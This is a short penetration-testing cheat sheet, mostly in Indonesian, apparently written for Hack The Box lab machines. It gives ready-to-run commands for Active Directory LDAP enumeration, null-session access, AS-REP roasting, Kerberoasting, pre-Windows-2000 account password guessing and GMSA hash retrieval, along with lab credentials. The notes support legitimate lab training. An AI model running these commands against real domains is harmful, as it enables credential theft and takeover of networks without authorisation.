adalah "phonebook" dari Active Directory. Semua object di domain — user, group, computer, GPO, SPN — tersimpan di sini. Kalau kita bisa query LDAP, kita bisa memetakan seluruh domain tanpa exploit apapun.

| Port | Services |
| ---- | -------- |
| 389  | LDAP     |
| 636  | LDAPS    |

# Enum
```shell
sudo nmap -n -sV --script 'ldap* and not brute' 10.10.11.42 -o nmap_ldap.txt
```

Level 0 -> Windows 2000
Level 2 -> Windows Server 2003
Level 3 -> Windows Server 2008
Level 4 -> Windows Server 2008 R2
Level 5 -> Windows Server 2012
Level 6 -> Windows Server 2012 R2
Level 7 -> Windows Server 2016
Level 10 -> Windows Server 2019/2022
# Null Session
test credential
```shell
nxc ldap <IP> -u '' -p ''
```

Login
```shell
ldapsearch -H ldap://overwatch.htb -x -b 'DC=overwatch,DC=htb'
```

# Authenticated Session
```shell
# outputnya banyak  
ldapsearch -H ldap://logging.htb -x -b 'DC=logging,DC=htb' -D 'wallace.everette@logging.htb' -w 'Welcome2026@' | tee ldapsearch.txt
```

# AS-REP Roasting 
```shell
nxc ldap 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' --asreproast asreproastable.txt
```

# User
```shell
nxc ldap <IP> -u '<user>' -p '<pass>' --users
```
# List Computer
```shell
nxc ldap 10.129.8.96 -u pentest -p 'p3nt3st2025!&' --computers
```
![](Attachments/Pasted%20image%2020260621170242.png)

# Password Policy
```shell
nxc ldap <IP> -u user -p pass --pass-pol
```
# Kerberoasting
```shell
nxc ldap 10.129.4.104 -u 'pentest' -p 'p3nt3st2025!&' --kerberoasting kerberoasting.txt
```
![](Attachments/Pasted%20image%2020260616092929.png)

# pre2k
When machine accounts are created with the "Assign this computer account as a pre-Windows 2000 computer" checkbox, their initial password is set to the lowercase hostname (without the `$`). These accounts were pre-created but never joined to the domain, so the password was never changed.
```shell
nxc ldap 10.129.4.198 -u 'pentest' -p 'p3nt3st2025!&' -M pre2k

# bisa null session juga
nxc ldap 10.129.4.198 -u '' -p '' --pre2k
```
![](Attachments/Pasted%20image%2020260616184912.png)
pada contoh diatas passwordnya adalah
`MS01$:ms01`
`EXCH01$:exch01`

biasnyha account dari output pre2k digunakan untuk serangan lanjuta GMSA
# GMSA
Akun GMSA biasanya ada `$` di akhirnya, seperti `MS01$` . 
karena kita menggunakan TGT, password bisa dikosongkan
![](Attachments/Pasted%20image%2020260618190850.png)
output dari GMSA adalah NTLM hash

